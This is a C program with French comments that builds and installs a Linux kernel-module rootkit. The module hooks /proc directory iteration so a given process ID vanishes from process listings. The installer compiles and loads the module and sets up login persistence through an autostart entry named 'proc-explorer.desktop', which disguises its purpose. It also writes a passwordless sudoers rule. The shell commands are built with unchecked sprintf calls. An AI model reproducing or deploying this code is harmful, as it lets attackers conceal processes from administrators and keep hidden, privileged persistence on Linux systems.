#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <dirent.h>
#include <signal.h>
#include <pwd.h>
#include <linux/limits.h>


// =================================================================================
// SECTION 1 : CONTENU DES FICHIERS EMBARQUÉS (INCHANGÉ)
// =================================================================================
const char *hide_pid_c_source =
    "#include <linux/module.h>\n"
    "#include <linux/version.h>\n"
    "#include <linux/kernel.h>\n"
    "#include <linux/init.h>\n"
    "#include <linux/fs.h>\n"
    "#include <linux/namei.h>\n"
    "#include <linux/string.h>\n"
    "#include <linux/types.h>\n\n"
    "static char* pid_to_hide_str = \"\";\n"
    "module_param(pid_to_hide_str, charp, 0644);\n"
    "MODULE_PARM_DESC(pid_to_hide_str, \"The PID of the process to hide.\");\n\n"
    "static const struct file_operations *original_proc_fops;\n"
    "static struct file_operations hacked_proc_fops;\n"
    "static int (*original_iterate_shared) (struct file *, struct dir_context *);\n"
    "static struct dir_context *original_ctx;\n"
    "static int hacked_iterate_shared(struct file *file, struct dir_context *ctx);\n\n"
    "#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 1, 0)\n"
    "static int hacked_filldir(struct dir_context *ctx, const char *name, int namelen,\n"
    "        loff_t off, u64 ino, unsigned int d_type)\n"
    "{\n"
    "    if (strncmp(name, pid_to_hide_str, strlen(pid_to_hide_str)) == 0) return 0;\n"
    "    return original_ctx->actor(original_ctx, name, namelen, off, ino, d_type);\n"
    "}\n"
    "#else\n"
    "static bool hacked_filldir(struct dir_context *ctx, const char *name, int namelen,\n"
    "        loff_t off, u64 ino, unsigned int d_type)\n"
    "{\n"
    "    if (strncmp(name, pid_to_hide_str, strlen(pid_to_hide_str)) == 0) return true;\n"
    "    return original_ctx->actor(original_ctx, name, namelen, off, ino, d_type);\n"
    "}\n"
    "#endif\n\n"
    "int hacked_iterate_shared(struct file *file, struct dir_context *ctx)\n"
    "{\n"
    "    original_ctx = ctx;\n"
    "    struct dir_context hacked_ctx = { .actor = hacked_filldir, .pos = ctx->pos };\n"
    "    int result = original_iterate_shared(file, &hacked_ctx);\n"
    "    ctx->pos = hacked_ctx.pos;\n"
    "    return result;\n"
    "}\n\n"
    "static int __init phide_init(void)\n"
    "{\n"
    "    struct path p; struct inode *proc_inode;\n"
    "    if (strlen(pid_to_hide_str) == 0) { return -EINVAL; }\n"
    "    if (kern_path(\"/proc\", 0, &p)) { return 0; }\n"
    "    proc_inode = p.dentry->d_inode;\n"
    "    original_proc_fops = proc_inode->i_fop;\n"
    "    memcpy(&hacked_proc_fops, original_proc_fops, sizeof(struct file_operations));\n"
    "    original_iterate_shared = original_proc_fops->iterate_shared;\n"
    "    hacked_proc_fops.iterate_shared = hacked_iterate_shared;\n"
    "    proc_inode->i_fop = &hacked_proc_fops;\n"
    "    path_put(&p);\n"
    "    return 0;\n"
    "}\n\n"
    "static void __exit phide_exit(void)\n"
    "{\n"
    "    struct path p; struct inode *proc_inode;\n"
    "    if (kern_path(\"/proc\", 0, &p)) { return; }\n"
    "    proc_inode = p.dentry->d_inode;\n"
    "    proc_inode->i_fop = original_proc_fops;\n"
    "    path_put(&p);\n"
    "}\n\n"
    "module_init(phide_init);\n"
    "module_exit(phide_exit);\n"
    "MODULE_LICENSE(\"GPL\");\n";

const char *makefile_source =
    "obj-m += hide_pid.o\n\n"
    "all:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\n"
    "clean:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n";

const char *desktop_entry_source =
    "[Desktop Entry]\n"
    "Type=Application\n"
    "Name=Lanceur Processus Caché\n"
    "Comment=Lance le processus caché en arrière-plan\n"
    "Exec=sudo /opt/my_hidden_process/my_hidden_process\n"
    "Terminal=true\n";

const char *installed_exe_path = "/opt/my_hidden_process/my_hidden_process";
const char *symlink_path = "/usr/local/bin/my_hidden_process";


// =================================================================================
// SECTION 2 : FONCTIONS UTILITAIRES (INCHANGÉ)
// =================================================================================
int run_command(const char *cmd) {
    int status = system(cmd);
    if (status != 0) {
        fprintf(stderr, "ERREUR : La commande '%s' a échoué avec le code %d\n", cmd, WEXITSTATUS(status));
        return -1;
    }
    return 0;
}

int write_file(const char *path, const char *content) {
    FILE *f = fopen(path, "w");
    if (!f) {
        perror("ERREUR : Impossible de créer le fichier");
        return -1;
    }
    fprintf(f, "%s", content);
    fclose(f);
    return 0;
}

// =================================================================================
// SECTION 3 : LOGIQUE DU PROGRAMME PRINCIPAL (PAYLOAD) (INCHANGÉ)
// =================================================================================
volatile sig_atomic_t keep_running = 1;
const char *install_dir = "/opt/my_hidden_process";
const char *pid_file_path = "/tmp/my_hidden_process.pid";

void child_sigterm_handler(int signum) { keep_running = 0; }

void print_child_proc_files(pid_t pid, const char *filename) {
    char path[512];
    sprintf(path, "/proc/%d/%s", pid, filename);
    printf("\n--- Contenu de %s ---\n", path);
    FILE *fp = fopen(path, "r");
    if (fp == NULL) {
        perror(path);
    } else {
        char line[1024];
        while (fgets(line, sizeof(line), fp) != NULL) { printf("%s", line); }
        fclose(fp);
    }
    printf("----------------------------------------------------------------\n");
}

void child_process_function() {
    signal(SIGTERM, child_sigterm_handler);
    signal(SIGINT, child_sigterm_handler);
    while (keep_running) { sleep(5); }
    exit(0);
}

int run_payload_logic() {
    if (geteuid() != 0) {
        fprintf(stderr, "Erreur : Cette action doit être exécutée en tant que root.\n");
        return EXIT_FAILURE;
    }

    FILE* pid_f = fopen(pid_file_path, "r");
    if (pid_f) {
        pid_t existing_pid = 0;
        fscanf(pid_f, "%d", &existing_pid);
        fclose(pid_f);
        if (existing_pid > 0 && kill(existing_pid, 0) == 0) {
            printf("Le processus caché est déjà en cours d'exécution avec le PID %d.\n", existing_pid);
            print_child_proc_files(existing_pid, "status");
            print_child_proc_files(existing_pid, "limits");
            printf("\nAppuyez sur Entrée pour continuer...\n");
            getchar();
            return EXIT_SUCCESS;
        }
    }


    pid_t pid = fork();

    if (pid < 0) {
        fprintf(stderr, "Le fork a échoué !\n");
        return 1;
    }

    if (pid > 0) { 
        printf("Processus enfant créé avec le PID : %d\n", pid);
        sleep(1);
        print_child_proc_files(pid, "status");
        print_child_proc_files(pid, "limits");

        char pid_str[16];
        sprintf(pid_str, "%d", pid);
        write_file(pid_file_path, pid_str);

        system("/sbin/rmmod hide_pid > /dev/null 2>&1");
        char command[256];
        sprintf(command, "/sbin/insmod %s/hide_pid.ko pid_to_hide_str=%d", install_dir, pid);
        run_command(command);

        printf("\n>>> Le processus %d a été lancé en arrière-plan et caché.\n", pid);

        printf("\nAppuyez sur Entrée pour fermer cette fenêtre...\n");
        getchar();

        return EXIT_SUCCESS;
    } else {
        child_process_function();
    }
    return 0;
}


// =================================================================================
// SECTION 4 : LOGIQUE DE L'INSTALLATEUR ET DU DÉSINSTALLATEUR (MODIFIÉ)
// =================================================================================
int run_uninstallation_logic() {
    if (geteuid() != 0) { return 1; }
    printf("--- Début de la désinstallation ---\n");

    // ...
    FILE* pid_f = fopen(pid_file_path, "r");
    if (pid_f) {
        pid_t pid_to_kill = 0;
        fscanf(pid_f, "%d", &pid_to_kill);
        fclose(pid_f);
        if (pid_to_kill > 0) { kill(pid_to_kill, SIGTERM); }
    }
    const char *sudo_user_str = getenv("SUDO_USER");
    if(sudo_user_str) {
        char autostart_file[PATH_MAX];
        sprintf(autostart_file, "/home/%s/.config/autostart/proc-explorer.desktop", sudo_user_str);
        remove(autostart_file);
    }
    remove("/etc/sudoers.d/99-hidden-process");

    if (remove(symlink_path) == 0) {

    }

    run_command("rm -rf /opt/my_hidden_process");
    remove(pid_file_path);
    run_command("/sbin/rmmod hide_pid > /dev/null 2>&1");
    printf("--- Désinstallation terminée avec succès. ---\n");
    return 0;
}

int run_installation_logic(const char *self_path) {
    if (geteuid() != 0) { return 1; }
    const char *sudo_user_str = getenv("SUDO_USER");
    if (!sudo_user_str) { return 1; }
    char absolute_self_path[PATH_MAX];
    realpath(self_path, absolute_self_path);

    printf("--- Début de l'installation... ---\n");
    printf("\n[ÉTAPE 1/6] Installation des dépendances...\n");
    if (run_command("apt-get update -y && apt-get install -y build-essential linux-headers-$(uname -r)") != 0) return 1;

    printf("\n[ÉTAPE 2/6] Compilation et installation des fichiers...\n");
    // ...
    const char *build_dir = "/tmp/hidden_process_build";
    run_command("rm -rf /tmp/hidden_process_build");
    mkdir(build_dir, 0755);
    chdir(build_dir);
    write_file("hide_pid.c", hide_pid_c_source);
    write_file("Makefile", makefile_source);
    if (run_command("make") != 0) return 1;
    run_command("mkdir -p /opt/my_hidden_process");
    run_command("cp hide_pid.ko /opt/my_hidden_process/");

    char copy_cmd[PATH_MAX * 2];
    sprintf(copy_cmd, "cp %s %s", absolute_self_path, installed_exe_path);
    run_command(copy_cmd);
   
    
    run_command("chmod +x /opt/my_hidden_process/my_hidden_process");

    printf("\n[ÉTAPE 3/6] Configuration du démarrage automatique...\n");
    // ...
    char autostart_path[PATH_MAX];
    sprintf(autostart_path, "/home/%s/.config/autostart", sudo_user_str);
    char mkdir_autostart_cmd[PATH_MAX + 10];
    sprintf(mkdir_autostart_cmd, "mkdir -p %s", autostart_path);
    run_command(mkdir_autostart_cmd);
    strcat(autostart_path, "/proc-explorer.desktop");
    if (write_file(autostart_path, desktop_entry_source) != 0) return 1;
    char chown_cmd[PATH_MAX * 2];
    sprintf(chown_cmd, "chown %s:%s %s", sudo_user_str, sudo_user_str, autostart_path);
    run_command(chown_cmd);

    printf("\n[ÉTAPE 4/6] Création de la commande globale 'my_hidden_process'...\n");
    char symlink_cmd[PATH_MAX * 2];
    sprintf(symlink_cmd, "ln -sf %s %s", installed_exe_path, symlink_path);
    if (run_command(symlink_cmd) != 0) return 1;

    printf("\n[ÉTAPE 5/6] Configuration de Sudo...\n");
    char sudoers_rule[512];
    sprintf(sudoers_rule, "%s ALL=(ALL) NOPASSWD: %s, %s", sudo_user_str, installed_exe_path, symlink_path);
    const char *sudoers_file_path = "/etc/sudoers.d/99-hidden-process";
    write_file(sudoers_file_path, sudoers_rule);
    run_command("chmod 0440 /etc/sudoers.d/99-hidden-process");

    printf("\n[ÉTAPE 6/6] Nettoyage...\n");
    run_command("rm -rf /tmp/hidden_process_build");

    printf("\n--- Installation terminée avec succès ! ---\n");
    printf("Vous pouvez maintenant exécuter ce programme depuis n'importe où en tapant :\n");
    printf("sudo my_hidden_process\n");
    printf("Ou en relançant l'exécutable d'origine :\n");
    printf("sudo ./my_hidden_process\n\n");
    
    printf("\n--- Lancement du processus pour la première fois... ---\n");
    chdir("/opt/my_hidden_process");
    return run_payload_logic();
}


// =================================================================================
// SECTION 5 : POINT D'ENTRÉE PRINCIPAL 
// =================================================================================
int main(int argc, char *argv[]) {
    if (geteuid() != 0) {
        fprintf(stderr, "ERREUR : Ce programme doit être lancé avec les privilèges root (ex: sudo %s).\n", argv[0]);
        return 1;
    }

    if (argc > 1 && strcmp(argv[1], "--uninstall") == 0) {
        return run_uninstallation_logic();
    }

    struct stat buffer;
    if (stat(installed_exe_path, &buffer) == 0) {
   
        chdir(install_dir);
        return run_payload_logic();
    } else {
        
        return run_installation_logic(argv[0]);
    }
}